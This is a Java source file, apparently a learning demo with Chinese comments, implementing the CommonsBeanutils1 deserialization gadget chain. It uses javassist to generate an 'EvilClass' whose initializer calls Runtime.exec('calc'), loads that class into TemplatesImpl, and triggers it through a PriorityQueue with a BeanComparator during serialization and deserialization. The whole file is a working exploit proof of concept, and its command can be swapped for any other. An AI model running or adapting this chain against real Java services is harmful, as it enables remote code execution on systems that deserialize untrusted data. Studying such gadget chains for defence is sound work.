package org.example.cb1;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsBeanutils1Demo2 {
    // 修改值的方法，简化代码
    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception{
        Field field = object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }

    public static void main(String[] args) throws Exception {
        // 创建恶意类，用于报错抛出调用链
        ClassPool pool = ClassPool.getDefault();
        CtClass payload = pool.makeClass("EvilClass");
        payload.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        payload.makeClassInitializer().setBody("new java.io.IOException().printStackTrace();");
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        byte[] evilClass = payload.toBytecode();

        // set field
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{evilClass});
        setFieldValue(templates, "_name", "test");
        setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());

        // 创建序列化对象
        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add("1");
        queue.add("1");

        // 修改值
        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        // 反序列化
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("result.ser"));
        out.writeObject(queue);
        ObjectInputStream in = new ObjectInputStream(new FileInputStream("result.ser"));
        in.readObject();

    }
}

